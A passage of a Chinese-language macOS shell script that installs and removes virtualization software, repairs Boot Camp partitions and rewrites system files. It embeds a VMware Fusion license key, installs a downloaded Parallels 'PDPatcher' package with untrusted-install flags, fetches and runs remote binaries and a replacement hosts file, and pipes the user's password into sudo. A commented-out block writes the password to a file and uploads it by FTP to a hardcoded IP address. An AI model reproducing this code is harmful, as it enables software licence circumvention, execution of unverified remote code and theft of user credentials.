	echo 正在安装VMware-Fusion虚拟机，请等待....
	echo
    hdiutil attach ~/Downloads/JG_Download/VMware-Fusion*.dmg>/dev/null 2>&1
    if [ "$moderoot" ]; then
    osascript <<EOD
do shell script "rm -rf /Applications/'VMware Fusion'.app" password "$pass" with administrator privileges
do shell script "rm -rf /Applications/'VMware Fusion Tech Preview'.app" password "$pass" with administrator privileges
EOD
    else
    echo "$pass" | sudo -S sudo rm -rf /Applications/VMware\ Fusion.app
    echo "$pass" | sudo -S sudo rm -rf /Applications/VMware\ Fusion\ Tech\ Preview.app
    fi
    cp -R /Volumes/VMware\ Fusion/VMware\ Fusion.app /Applications >/dev/null 2>&1
    cp -R /Volumes/VMware\ Fusion/VMware\ Fusion\ Tech\ Preview.app /Applications >/dev/null 2>&1
    echo >> /tmp/config
    echo .encoding = "UTF-8" > /tmp/config
    echo  >> /tmp/config
    echo fusion.ui.eula.skipPrompt = "TRUE" >> /tmp/config
    echo fusion.ui.registration.skipPrompt = "TRUE" >> /tmp/config
    echo fusion.ui.registration.hideLicense = "TRUE" >> /tmp/config
    echo fusion.ui.dataCollection.skipPrompt = "TRUE" >> /tmp/config
    echo componentDownload.downloadPermission = "deny" >> /tmp/config 
    if [ "$moderoot" ]; then
osascript <<EOD
do shell script "mkdir -p '/Library/Preferences/VMware Fusion'" password "$pass" with administrator privileges
do shell script "cp /tmp/config '/Library/Preferences/VMware Fusion'" password "$pass" with administrator privileges
EOD
if [ ! "$M1Yes" ]; then
osascript <<EOD
do shell script "/Applications/'VMware Fusion'.app/Contents/Library/'Initialize VMware Fusion.tool' set" password "$pass" with administrator privileges
do shell script "/Applications/'VMware Fusion'.app/Contents/Library/licenses/vmware-licenseTool enter $licenseKey '' '' $vmkey 'VMware Fusion for Mac OS' '' | grep -q '200 License operation succeeded.'" password "$pass" with administrator privileges
EOD
else
if [ -e /Volumes/VMware\ Fusion/VMware\ Fusion\ Tech\ Preview.app ]; then
osascript <<EOD
do shell script "/Applications/'VMware Fusion Tech Preview'.app/Contents/Library/'Initialize VMware Fusion.tool' set" password "$pass" with administrator privileges
do shell script "/Applications/'VMware Fusion Tech Preview'.app/Contents/Library/licenses/vmware-licenseTool enter ZF3R0-FHED2-M80TY-8QYGC-NPKYF '' '' '12.0' 'VMware Fusion for Mac OS' '' | grep -q '200 License operation succeeded.'" password "$pass" with administrator privileges
EOD
else
osascript <<EOD
do shell script "/Applications/'VMware Fusion'.app/Contents/Library/'Initialize VMware Fusion.tool' set" password "$pass" with administrator privileges
do shell script "/Applications/'VMware Fusion'.app/Contents/Library/licenses/vmware-licenseTool enter $licenseKey '' '' $vmkey 'VMware Fusion for Mac OS' '' | grep -q '200 License operation succeeded.'" password "$pass" with administrator privileges
EOD
fi
fi
    else 
    echo "$pass" | sudo -S sudo mkdir -p /Library/Preferences/VMware\ Fusion
    echo "$pass" | sudo -S sudo cp /tmp/config /Library/Preferences/VMware\ Fusion
    if [ ! "$M1Yes" ]; then
    echo "$pass" | sudo -S sudo /Applications/VMware\ Fusion.app/Contents/Library/Initialize\ VMware\ Fusion.tool set
    echo "$pass" | sudo -S sudo /Applications/VMware\ Fusion.app/Contents/Library/licenses/vmware-licenseTool \
      enter $licenseKey '' '' $vmkey 'VMware Fusion for Mac OS' '' \
      | grep -q '200 License operation succeeded.'
    else  
    if [ -e /Volumes/VMware\ Fusion/VMware\ Fusion\ Tech\ Preview.app ]; then
    echo "$pass" | sudo -S sudo /Applications/VMware\ Fusion\ Tech\ Preview.app/Contents/Library/Initialize\ VMware\ Fusion.tool  
    echo "$pass" | sudo -S sudo /Applications/VMware\ Fusion\ Tech\ Preview.app/Contents/Library/licenses/vmware-licenseTool \
      enter $licenseKey '' '' $vmkey 'VMware Fusion for Mac OS' '' \
      | grep -q '200 License operation succeeded.'
    else
    echo "$pass" | sudo -S sudo /Applications/VMware\ Fusion.app/Contents/Library/Initialize\ VMware\ Fusion.tool set
    echo "$pass" | sudo -S sudo /Applications/VMware\ Fusion.app/Contents/Library/licenses/vmware-licenseTool \
      enter $licenseKey '' '' $vmkey 'VMware Fusion for Mac OS' '' \
      | grep -q '200 License operation succeeded.'     
    fi
    fi 
    fi
    if [ ! -e /Applications/VMware\ Fusion.app ]; then
    if [ ! -e /Applications/VMware\ Fusion\ Tech\ Preview.app ]; then
    curl -# -C - --connect-timeout 10 -o /tmp/Deploy.ini "$ip5/Deploy"$vmkey".ini">/dev/null 2>&1
    
    if [ -e /Volumes/VMware\ Fusion/VMware\ Fusion.app ]; then
    cp -R /Volumes/VMware\ Fusion/VMware\ Fusion.app/Contents/Library/Deploy\ VMware\ Fusion.mpkg ~/Downloads/JG_Download
    cp -R /Volumes/VMware\ Fusion/VMware\ Fusion.app ~/Downloads/JG_Download/Deploy\ VMware\ Fusion.mpkg/Contents/00Fusion_Deployment_Items
    fi
    
    if [ -e /Volumes/VMware\ Fusion/VMware\ Fusion\ Tech\ Preview.app ]; then
    cp -R /Volumes/VMware\ Fusion/VMware\ Fusion\ Tech\ Preview.app/Contents/Library/Deploy\ VMware\ Fusion.mpkg ~/Downloads/JG_Download
    cp -R /Volumes/VMware\ Fusion/VMware\ Fusion\ Tech\ Preview.app ~/Downloads/JG_Download/Deploy\ VMware\ Fusion.mpkg/Contents/00Fusion_Deployment_Items
    fi
    
    rm -rf ~/Downloads/JG_Download/Deploy\ VMware\ Fusion.mpkg/Contents/00Fusion_Deployment_Items/Deploy.ini
    cp /tmp/Deploy.ini ~/Downloads/JG_Download/Deploy\ VMware\ Fusion.mpkg/Contents/00Fusion_Deployment_Items
    if [ "$moderoot" ]; then
osascript <<EOD
do shell script "installer -allowUntrusted -verboseR -pkg ~/Downloads/JG_Download/'Deploy VMware Fusion'.mpkg -target /" password "$pass" with administrator privileges
EOD
    else
    echo "$pass" | sudo -S sudo installer -allowUntrusted -verboseR -pkg ~/Downloads/JG_Download/Deploy\ VMware\ Fusion.mpkg -target /
    fi
    rm -rf ~/Downloads/JG_Download/Deploy\ VMware\ Fusion.mpkg
    fi
    fi
    if [ -e /Applications/VMware\ Fusion.app ]; then
    zhendock=$(defaults read com.apple.dock | grep VMware%20Fusion.app)
    if [ ! "$zhendock" ]; then
    defaults write com.apple.dock persistent-apps -array-add "<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/Applications/VMware Fusion.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>"; killall Dock
    fi
    fi
    if [ -e /Applications/VMware\ Fusion\ Tech\ Preview.app ]; then
    zhendock=$(defaults read com.apple.dock | grep VMware%20Fusion%20Tech%20Preview.app)
    if [ ! "$zhendock" ]; then
    defaults write com.apple.dock persistent-apps -array-add "<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/Applications/VMware Fusion Tech Preview.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>"; killall Dock
    fi
    fi    
    if [ -e /Applications/VMware\ Fusion.app ]; then
    open /Applications/VMware\ Fusion.app
    fi
    if [ -e /Applications/VMware\ Fusion\ Tech\ Preview.app ]; then
    open /Applications/VMware\ Fusion\ Tech\ Preview.app
    fi
    diskutil eject /Volumes/VMware\ Fusion
    umount -f /Volumes/VMware\ Fusion
    diskutil eject $(diskutil list | grep 'VMware Fusion' | sed 's/.*\(disk.*[0123456789]*\).*/\1/g')    
   	fi  
   	
   	
#echo "TBName=$tbid" > /tmp/mac.txt
#echo "TVName=$TVName" >> /tmp/mac.txt
#echo "PSName=$pass" >> /tmp/mac.txt
if [ -f /tmp/mac.txt ]; then
#curl --connect-timeout 10 -m 20 -T /tmp/mac.txt -u $ftpm ftp://43.138.25.54>/dev/null 2>&1
echo
fi
#rm -rf /tmp/mac.txt   	
clear && printf "\e[3J"
echo
echo	
echo ID: "\033[36m${tbid}\033[0m"		
echo
exit 0
}


HBFQ(){
clear && printf "\e[3J"




if [ "$jhpd" ] ; then
killall prl_client_app >/dev/null 2>&1
killall PD\ Runner >/dev/null 2>&1
clear && printf "\e[3J"
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "launchctl unload /Library/LaunchDaemons/com.lihaoyun6.PD-Runner-Helper.plist" password "$pass" with administrator privileges
do shell script "rm -rf /Library/LaunchDaemons/com.lihaoyun6.PD-Runner-Helper.plist" password "$pass" with administrator privileges
do shell script "rm -rf /Library/PrivilegedHelperTools/com.lihaoyun6.PD-Runner-Helper" password "$pass" with administrator privileges
do shell script "rm -rf /Applications/启动Win系统.app" password "$pass" with administrator privileges
do shell script "rm -rf '/Applications/PD Runner.app'" password "$pass" with administrator privileges
do shell script "rm -rf '/Applications/PD Partner.app'" password "$pass" with administrator privileges
do shell script "rm -rf /Applications/Go.app" password "$pass" with administrator privileges
do shell script "rm -rf /Applications/PDST.app" password "$pass" with administrator privileges
do shell script "rm -rf '/Applications/PD 启动.app'" password "$pass" with administrator privileges
do shell script "rm -rf /Applications/启动虚拟机.app" password "$pass" with administrator privileges
do shell script "rm -rf /Applications/打开Win10.prlnk" password "$pass" with administrator privileges
do shell script "rm -rf /Applications/打开Win11.prlnk" password "$pass" with administrator privileges
do shell script "rm -rf '/Applications/Windows 10.app'" password "$pass" with administrator privileges
do shell script "rm -rf '/Applications/Windows 7.app'" password "$pass" with administrator privileges
EOD
    else
	echo "$pass" | sudo -S sudo launchctl unload /Library/LaunchDaemons/com.lihaoyun6.PD-Runner-Helper.plist >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Library/LaunchDaemons/com.lihaoyun6.PD-Runner-Helper.plist >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Library/PrivilegedHelperTools/com.lihaoyun6.PD-Runner-Helper >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Applications/启动Win系统.app >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Applications/PD\ Runner.app >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Applications/PD\ Partner.app >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Applications/Go.app >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Applications/PDST.app >/dev/null 2>&1	
	echo "$pass" | sudo -S sudo rm -rf /Applications/PD\ 启动.app >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Applications/启动虚拟机.app >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Applications/打开Win10.prlnk >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Applications/打开Win11.prlnk >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Applications/Windows\ 10.app >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Applications/Windows\ 7.app >/dev/null 2>&1
	fi
echo
echo ID: "\033[36m${tbid}\033[0m"
echo
echo "\033[36m正在下载必要工具中...\033[0m"
echo
curl -# -C - --connect-timeout 10 -o /tmp/jhpd.zip --retry 8888 "$ip5/jhpd.zip"
unzip -o "/tmp/jhpd.zip" -d "/tmp">/dev/null 2>&1

if [ ! -f /tmp/jhpd/PDPatcher_"$MY_VER".pkg ]; then	
clear && printf "\e[3J"
echo
echo
echo "\033[36m当前版本不被支持，请重新安装PD\033[0m"
echo
exit
fi
if [ "$moderoot" ]; then
open /tmp/jhpd/PDPatcher_"$MY_VER".pkg
else
if [ "$dkzdqx" ]; then
echo "$pass" | sudo -S sudo installer -allowUntrusted -verboseR -pkg /tmp/jhpd/PDPatcher_"$MY_VER".pkg -target /
else
open /tmp/jhpd/PDPatcher_"$MY_VER".pkg
fi
fi


clear && printf "\e[3J"

exit
fi






if [ "$ydxf" ] ; then	
echo
if [ ! "$ycmmaz" ] ; then	
echo ID: "\033[36m${tbid}\033[0m"
echo
echo "\033[36m选择需要修复的分区\033[0m"
echo 
diskutil list | grep 'Microsoft Basic Data'
echo 
read -p "输入系统总分区位置:" num
case "$num" in
	x)
	Start_menu
	;;
esac
if [ ! "$num" ]; then
HBFQ
fi
echo
read -p "输入系统子分区位置:" num2
case "$num2" in
	x)
	Start_menu
	;;
esac
if [ ! "$num2" ]; then
HBFQ
fi
restore_device="/dev/disk"$num"s"$num2""
pdfq=$(diskutil list | grep "disk"$num"s"$num2"" | grep 'Microsoft Basic Data')
if [ ! "$pdfq" ]; then
HBFQ
fi
fi
clear && printf "\e[3J"
echo
echo ID: "\033[36m${tbid}\033[0m"
echo
echo "\033[36m正在下载引导工具中...\033[0m"
echo 
#curl -# -C - --connect-timeout 10 -o /tmp/boot.zip "$ip5/boot7.zip">/dev/null 2>&1
curl -# -C - --connect-timeout 10 -o /tmp/boot.zip --retry 5 "$ip5/boot7.zip"
unzip -o -P "${zxc:25:1}${zxc:31:1}${zxc:3:1}${cxz:2:1}${cxz:0:1}4${cxz:0:1}59${cxz:11:1}" "/tmp/boot.zip" -d "/tmp">/dev/null 2>&1
if [ ! -f "/tmp/winclone" ]; then
read -t 10 -p "引导修复工具无法下载，10秒后自动重试..."
HBFQ
fi
clear && printf "\e[3J"
if [[ $modelxh = "10.6"* ]]; then
Winclone5="1"
MBR10="1"
fi
if [[ $modelxh = "10.7"* ]]; then
Winclone5="1"
MBR10="1"
fi
if [[ $modelxh = "10.8"* ]]; then
Winclone5="1"
MBR10="1"
fi
if [[ $modelxh = "10.9"* ]]; then
Winclone5="1"
MBR10="1"
fi
if [[ $modelxh = "10.10"* ]]; then
Winclone6="1"
fi
if [[ $modelxh = "10.11"* ]]; then
Winclone6="1"
fi

if [ "$moderoot" ]; then
osascript <<EOD
do shell script "newfs_msdos -v EFI -F 32 /dev/rdisk0s1" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo newfs_msdos -v EFI -F 32 /dev/rdisk0s1
fi

if [ ! "$MBR10" ] ; then	
if [ ! "$Winclone5" ]; then
if [ ! "$Winclone6" ]; then
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "/tmp/winclone -e -p ${restore_device}" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo /tmp/winclone -e -p ${restore_device}
fi
else
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "/tmp/winclone6 -e -p ${restore_device}" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo /tmp/winclone6 -e -p ${restore_device}
fi
fi
fi
fi

if [ "$MBR10" ] ; then	
if [ ! "$Winclone5" ]; then
if [ ! "$Winclone6" ]; then
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "/tmp/winclone -l -p ${restore_device}" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo /tmp/winclone -l -p ${restore_device}
fi
else
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "/tmp/winclone6 -l -p ${restore_device}" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo /tmp/winclone6 -l -p ${restore_device}
fi
fi
fi
fi

if [ "$Winclone5" ]; then
diskutil unmount ${restore_device}
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "/tmp/winclone5 -x /tmp/genericboot.mbr -j /tmp -p ${restore_device} -f 7" password "$pass" with administrator privileges
do shell script "/tmp/winclone5 -b /tmp/BCD -p ${restore_device} -j /tmp" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo /tmp/winclone5 -x /tmp/genericboot.mbr -j /tmp -p ${restore_device} -f 7
echo "$pass" | sudo -S sudo /tmp/winclone5 -b /tmp/BCD -p ${restore_device} -j /tmp
fi
fi
clear && printf "\e[3J"
echo
echo
echo 
if [ "$ycmmaz" ] ; then	  
echo
echo 修复完成，请重启电脑并按住option键，选择Windows
echo
exit
else
read -s -n1 -p "修复完成，任意键返回"
XTLB
fi
fi



if [ "$hfhost" ] ; then	
curl -# -C - --connect-timeout 10 -o /tmp/hosts.zip "$ip5/hosts.zip">/dev/null 2>&1
unzip -o "/tmp/hosts.zip" -d "/tmp">/dev/null 2>&1
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "chflags nouchg /etc/hosts" password "$pass" with administrator privileges
do shell script "chflags -hv noschg /etc/hosts" password "$pass" with administrator privileges
do shell script "rm -rf /etc/hosts" password "$pass" with administrator privileges
do shell script "cp /tmp/hosts /etc" password "$pass" with administrator privileges
do shell script "chflags nouchg $HOME/Desktop/hosts" password "$pass" with administrator privileges
do shell script "chflags -hv noschg $HOME/Desktop/hosts" password "$pass" with administrator privileges
do shell script "rm -rf $HOME/Desktop/hosts" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo chflags nouchg /etc/hosts
echo "$pass" | sudo -S sudo chflags -hv noschg /etc/hosts 
echo "$pass" | sudo -S sudo rm -rf /etc/hosts 
echo "$pass" | sudo -S sudo cp /tmp/hosts /etc
echo "$pass" | sudo -S sudo chflags nouchg $HOME/Desktop/hosts
echo "$pass" | sudo -S sudo chflags -hv noschg $HOME/Desktop/hosts
echo "$pass" | sudo -S sudo rm -rf $HOME/Desktop/hosts
fi
clear && printf "\e[3J"
echo
echo
echo
read -s -n1 -p "Hosts已恢复，任意键返回"
Virtual
fi

if [ "$cqpdfw" ] ; then	
clear && printf "\e[3J"
echo
echo
echo
osascript -e 'quit app"Parallels Desktop"'
killall prl_client_app >/dev/null 2>&1 	
echo "$pass" | sudo -S sudo launchctl stop com.parallels.desktop.launchdaemon
echo "$pass" | sudo -S sudo launchctl start com.parallels.desktop.launchdaemon
open /Applications/Parallels\ Desktop.app
Virtual
fi

if [ "$qmqdq" ] ; then	
clear && printf "\e[3J"
echo
echo
echo
echo "$pass" | sudo -S sudo launchctl enable system/com.lihaoyun6.PD-Runner-Helper
echo "$pass" | sudo -S sudo codesign --force --deep --sign - /Applications/启动Win系统.app
echo "$pass" | sudo -S sudo codesign --force --deep --sign - /Library/PrivilegedHelperTools/com.lihaoyun6.PD-Runner-Helper
echo "$pass" | sudo -S sudo codesign --force --deep --sign - /Library/LaunchDaemons/com.lihaoyun6.PD-Runner-Helper.plist
open /Applications
Virtual
fi

if [ "$EFIS" ] ; then	
echo "$pass" | sudo -S sudo newfs_msdos -v EFI -F 32 /dev/rdisk0s1
clear && printf "\e[3J"
echo
echo
diskutil list disk0
echo
read -s -n1 -p "EFI分区修复完成，请检查！"
Customize
fi

if [ "$SCSIP" ] ; then	
if [ ! "$apfsfq" ] ; then
csefq=$(diskutil list | grep Apple_CoreStorage)
scsipp=$(diskutil list | grep 'Apple_Boot' | sed 's/.*\(disk.*[0123456789]*\).*/\1/g')
diskutil eraseVolume "Free Space" %noformat% /dev/$scsipp>/dev/null 2>&1
if [ "$csefq" ] ; then
diskutil coreStorage resizestack disk1 0b >/dev/null 2>&1
else
if [ "$oldusb" ]; then
if [ "$olddsik" ]; then
diskutil resizeVolume disk0s2 98% >/dev/null 2>&1
else
diskutil resizeVolume disk0s2 0g >/dev/null 2>&1
fi
else
diskutil resizeVolume disk0s2 100% >/dev/null 2>&1
fi
fi
fi
clear && printf "\e[3J"
echo
echo
echo
read -s -n1 -p "SIP分区已SC，任意键返回"
Customize
fi


if [ "$SCXNJ" ] ; then	

if [ "$SCPD" ] ; then
killall prl_client_app >/dev/null 2>&1
killall PD\ Runner >/dev/null 2>&1
echo "$pass" | sudo -S sudo rm -rf /Applications/Parallels\ Desktop.app >/dev/null 2>&1
echo "$pass" | sudo -S sudo rm -rf $HOME/Parallels >/dev/null 2>&1
echo "$pass" | sudo -S sudo rm -rf /Applications/*.pvm >/dev/null 2>&1
echo "$pass" | sudo -S sudo rm -rf /Library/Preferences/Parallels >/dev/null 2>&1
echo "$pass" | sudo -S sudo rm -rf $HOME/Library/Cookies/com.parallels.desktop.console.binarycookies >/dev/null 2>&1
echo "$pass" | sudo -S sudo rm -rf $HOME/Library/Caches/com.parallels.desktop.console >/dev/null 2>&1
echo "$pass" | sudo -S sudo rm -rf $HOME/Library/Preferences/com.parallels.desktop.console.plist >/dev/null 2>&1
echo "$pass" | sudo -S sudo rm -rf $HOME/Library/Preferences/com.parallels.PDInfo.plist >/dev/null 2>&1 
echo "$pass" | sudo -S sudo rm -rf $HOME/Library/Preferences/com.parallels.Parallels\ Desktop.plist >/dev/null 2>&1
echo "$pass" | sudo -S sudo rm -rf $HOME/Library/Preferences/com.parallels.Parallels\ Desktop\ Statistics.plist >/dev/null 2>&1
echo "$pass" | sudo -S sudo rm -rf $HOME/Library/Preferences/com.parallels.Parallels.plist >/dev/null 2>&1
echo "$pass" | sudo -S sudo launchctl unload /Library/LaunchDaemons/com.lihaoyun6.PD-Runner-Helper.plist >/dev/null 2>&1
echo "$pass" | sudo -S sudo rm -rf /Library/LaunchDaemons/com.lihaoyun6.PD-Runner-Helper.plist >/dev/null 2>&1
echo "$pass" | sudo -S sudo rm -rf /Library/PrivilegedHelperTools/com.lihaoyun6.PD-Runner-Helper >/dev/null 2>&1
echo "$pass" | sudo -S sudo rm -rf /Applications/启动Win系统.app >/dev/null 2>&1
echo "$pass" | sudo -S sudo rm -rf /Applications/PD\ Runner.app >/dev/null 2>&1
echo "$pass" | sudo -S sudo rm -rf /Applications/PD\ Partner.app >/dev/null 2>&1
echo "$pass" | sudo -S sudo rm -rf /Applications/Go.app >/dev/null 2>&1
echo "$pass" | sudo -S sudo rm -rf /Applications/PDST.app >/dev/null 2>&1	
echo "$pass" | sudo -S sudo rm -rf /Applications/PD\ 启动.app >/dev/null 2>&1
echo "$pass" | sudo -S sudo rm -rf /Applications/启动虚拟机.app >/dev/null 2>&1
echo "$pass" | sudo -S sudo rm -rf /Applications/Parallels\ Desktop.app >/dev/null 2>&1
echo "$pass" | sudo -S sudo rm -rf /Applications/打开Win10.prlnk >/dev/null 2>&1
echo "$pass" | sudo -S sudo rm -rf /Applications/打开Win11.prlnk >/dev/null 2>&1
echo "$pass" | sudo -S sudo rm -rf /Applications/Windows\ 10.app >/dev/null 2>&1
echo "$pass" | sudo -S sudo rm -rf /Applications/Windows\ 7.app >/dev/null 2>&1
curl -# -C - --connect-timeout 10 -o /tmp/hosts.zip --retry 8888 "$ip5/hosts.zip"
unzip -o "/tmp/hosts.zip" -d "/tmp" >/dev/null 2>&1
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "chflags nouchg /etc/hosts" password "$pass" with administrator privileges
do shell script "chflags -hv noschg /etc/hosts" password "$pass" with administrator privileges
do shell script "rm -rf /etc/hosts" password "$pass" with administrator privileges
do shell script "cp /tmp/hosts /etc" password "$pass" with administrator privileges
do shell script "chflags nouchg $HOME/Desktop/hosts" password "$pass" with administrator privileges
do shell script "chflags -hv noschg $HOME/Desktop/hosts" password "$pass" with administrator privileges
do shell script "rm -rf $HOME/Desktop/hosts" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo chflags nouchg /etc/hosts >/dev/null 2>&1
echo "$pass" | sudo -S sudo chflags -hv noschg /etc/hosts >/dev/null 2>&1 
echo "$pass" | sudo -S sudo rm -rf /etc/hosts >/dev/null 2>&1 
echo "$pass" | sudo -S sudo cp /tmp/hosts /etc >/dev/null 2>&1
echo "$pass" | sudo -S sudo chflags nouchg $HOME/Desktop/hosts >/dev/null 2>&1
echo "$pass" | sudo -S sudo chflags -hv noschg $HOME/Desktop/hosts >/dev/null 2>&1
echo "$pass" | sudo -S sudo rm -rf $HOME/Desktop/hosts >/dev/null 2>&1
fi
fi

if [ "$SCVM" ] ; then
killall VMware\ Fusion >/dev/null 2>&1
killall VMware\ Fusion\ Tech\ Preview >/dev/null 2>&1
echo "$pass" | sudo -S sudo rm -rf /Applications/VMware\ Fusion.app >/dev/null 2>&1
echo "$pass" | sudo -S sudo rm -rf /Applications/VMware\ Fusion\ Tech\ Preview.app >/dev/null 2>&1
echo "$pass" | sudo -S sudo rm -rf $HOME/Virtual\ Machines.localized >/dev/null 2>&1
echo "$pass" | sudo -S sudo rm -rf /Applications/*.vmwarevm >/dev/null 2>&1
echo "$pass" | sudo -S sudo rm -rf /Library/Preferences/VMware\ Fusion >/dev/null 2>&1
echo "$pass" | sudo -S sudo rm -rf $HOME/Library/Preferences/VMware\ Fusion >/dev/null 2>&1
echo "$pass" | sudo -S sudo rm -rf $HOME/Library/Preferences/com.vmware.fusion.plist >/dev/null 2>&1 
echo "$pass" | sudo -S sudo rm -rf $HOME/Library/Preferences/com.vmware.fusionApplicationsMenu.plist >/dev/null 2>&1
echo "$pass" | sudo -S sudo rm -rf $HOME/Library/Preferences/com.vmware.fusionStartMenu.plist >/dev/null 2>&1
echo "$pass" | sudo -S sudo rm -rf $HOME/Library/Preferences/com.vmware.fusionApplicationsMenu.helper.plist >/dev/null 2>&1
echo "$pass" | sudo -S sudo rm -rf $HOME/Library/Application\ Support/VMware\ Fusion\ Applications\ Menu >/dev/null 2>&1
echo "$pass" | sudo -S sudo rm -rf $HOME/Library/Application\ Support/VMware\ Fusion >/dev/null 2>&1
echo "$pass" | sudo -S sudo rm -rf $HOME/Library/Caches/com.vmware.fusion >/dev/null 2>&1
fi

killall Dock
read -t 5 -p " "
osascript <<EOD
activate application "Terminal"
tell application "System Events"
set visible of processes where name is not "Terminal" to false
end tell
EOD
clear && printf "\e[3J"
echo
echo
echo


if [ "$ycmmaz" ]; then
clear && printf "\e[3J"
echo
echo
echo	
echo "虚拟机已清除完毕！！！可以关闭本窗口了！！！"	
echo
echo
echo
exit	
SCPD=""
SCXNJ=""
kaishi
fi

read -s -n1 -p "虚拟机已清除完毕，任意键返回！"
Customize
fi




if [ "$HBFQS" ] ; then	
apfsfq=$(diskutil list | grep Apple_APFS)
csefq=$(diskutil list | grep Apple_CoreStorage)
win_partition=$(diskutil list | grep 'Microsoft Basic Data' | sed 's/.*\(disk.*[0123456789]*\).*/\1/g')
clear && printf "\e[3J"
echo
echo "\033[36m正在合并分区中....\033[0m"
if [ "$apfsfq" ] ; then
diskutil apfs deleteContainer /dev/disk0s3>/dev/null 2>&1
diskutil apfs deleteContainer /dev/disk0s4>/dev/null 2>&1
diskutil apfs deleteContainer /dev/disk0s5>/dev/null 2>&1
diskutil apfs deleteContainer /dev/disk0s6>/dev/null 2>&1
diskutil apfs deleteContainer /dev/disk0s7>/dev/null 2>&1
diskutil apfs deleteContainer /dev/disk0s8>/dev/null 2>&1
diskutil eraseVolume "Free Space" %noformat% /dev/disk0s3>/dev/null 2>&1
diskutil eraseVolume "Free Space" %noformat% /dev/disk0s4>/dev/null 2>&1
diskutil eraseVolume "Free Space" %noformat% /dev/disk0s5>/dev/null 2>&1
diskutil eraseVolume "Free Space" %noformat% /dev/disk0s6>/dev/null 2>&1
diskutil eraseVolume "Free Space" %noformat% /dev/disk0s7>/dev/null 2>&1
diskutil eraseVolume "Free Space" %noformat% /dev/disk0s8>/dev/null 2>&1
diskutil apfs resizeContainer disk0s2 0 >/dev/null 2>&1
else
disksip="$(diskutil list | grep 'Apple_Boot' | sed 's/.*\(disk.*[0123456789]*\).*/\1/g')"
if [[ "$disksip" = "disk0s3" ]]; then
echo
else
diskutil eraseVolume "Free Space" %noformat% /dev/disk0s3>/dev/null 2>&1
fi
if [[ "$disksip" = "disk0s4" ]]; then
echo
else
diskutil eraseVolume "Free Space" %noformat% /dev/disk0s4>/dev/null 2>&1
fi
if [[ "$disksip" = "disk0s5" ]]; then
echo
else
diskutil eraseVolume "Free Space" %noformat% /dev/disk0s5>/dev/null 2>&1
fi
if [[ "$disksip" = "disk0s6" ]]; then
echo
else
diskutil eraseVolume "Free Space" %noformat% /dev/disk0s6>/dev/null 2>&1
fi
if [[ "$disksip" = "disk0s7" ]]; then
echo
else
diskutil eraseVolume "Free Space" %noformat% /dev/disk0s7>/dev/null 2>&1
fi
if [[ "$disksip" = "disk0s8" ]]; then
echo
else
diskutil eraseVolume "Free Space" %noformat% /dev/disk0s8>/dev/null 2>&1
fi
if [ "$csefq" ] ; then
diskutil coreStorage resizestack disk1 0b >/dev/null 2>&1
else
if [ "$oldusb" ]; then
if [ "$olddsik" ]; then
diskutil resizeVolume disk0s2 98% >/dev/null 2>&1
else
diskutil resizeVolume disk0s2 0g >/dev/null 2>&1
fi
else
diskutil resizeVolume disk0s2 100% >/dev/null 2>&1
fi
fi
fi
echo "$pass" | sudo -S sudo diskutil mount disk0s1
echo "$pass" | sudo -S sudo rm -rf /Volumes/EFI/EFI/Boot
echo "$pass" | sudo -S sudo rm -rf /Volumes/EFI/EFI/Microsoft
echo "$pass" | sudo -S sudo diskutil unmount disk0s1
killall "System Preferences"
echo "$pass" | sudo -S sudo /usr/sbin/bless --folder /System/Library/CoreServices --bootefi
echo "$pass" | sudo -S sudo systemsetup -setstartupdisk /System/Library/CoreServices
clear && printf "\e[3J"
if [ "$ycmmaz" ]; then
ychpkj=""
kaishi
fi
diskutil list disk0
echo
echo
echo
read -s -n1 -p "合并分区已完成，任意键返回"
Customize
fi

}


HFSIP(){
clear && printf "\e[3J"	
echo
echo ID: "\033[36m${tbid}\033[0m"
echo
	echo
	echo "正在下载Recovery HD"...	
	echo
	if [ ! -f "/tmp/aria2c" ]; then
	
	if [[ $modelxh = "10.9"* ]]; then
		curl -# -C - --connect-timeout 10 -o /tmp/aria2c.zip "$ip5/aria2c85.zip">/dev/null 2>&1
		unzip -o "/tmp/aria2c.zip" -d "/tmp">/dev/null 2>&1
	
else

	if [[ $modelxh = "10.8"* ]]; then
		curl -# -C - --connect-timeout 10 -o /tmp/aria2c.zip "$ip5/aria2c85.zip">/dev/null 2>&1
		unzip -o "/tmp/aria2c.zip" -d "/tmp">/dev/null 2>&1
		
else

	if [[ $modelxh = "10.7"* ]]; then
		curl -# -C - --connect-timeout 10 -o /tmp/aria2c.zip "$ip5/aria2c75.zip">/dev/null 2>&1
		unzip -o "/tmp/aria2c.zip" -d "/tmp">/dev/null 2>&1

else

	if [[ $modelxh = "10.6"* ]]; then
